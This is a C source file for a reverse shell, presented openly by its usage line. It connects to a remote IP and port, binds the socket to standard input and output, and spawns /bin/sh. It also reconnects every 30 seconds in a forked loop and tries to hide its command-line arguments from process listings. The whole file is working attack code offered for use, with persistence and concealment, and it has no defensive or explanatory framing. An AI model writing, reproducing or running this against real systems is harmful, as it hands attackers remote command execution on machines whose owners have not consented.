#include <stdlib.h>
#include <netinet/in.h>
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

// Usage: ./reverse-shell [IP] [PORT]

in_addr_t inet_addr(const char *cp);

void spawnshell(int sock)
{
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execve("/bin/sh", (char *[]){NULL}, (char *[]){NULL});
}

int main(int argc, char *argv[])
{

    if (argc <= 2)
    {
        exit(1);
    }
    // Hide command line arguments
    char *arg_end;
    arg_end = argv[argc - 1] + strlen(argv[argc - 1]);
    *arg_end = ' ';

    char REMOTE_ADDR[30];
    strcpy(REMOTE_ADDR, argv[1]);
    int TCP_PORT = atoi(argv[2]);

    int sock;
    struct sockaddr_in server, client;

    signal(SIGCHLD, SIG_IGN);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    server.sin_port = htons(TCP_PORT);

    while (1)
    {

        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        {
            exit(1);
        }

        if (fork() == 0)
        {

            if ((connect(sock, (struct sockaddr *)&server, sizeof server)) < 0)
            {
                exit(2);
            }

            spawnshell(sock);
            exit(0);
        }
        else
            close(sock);
        sleep(30);
    }
    return 0;
}
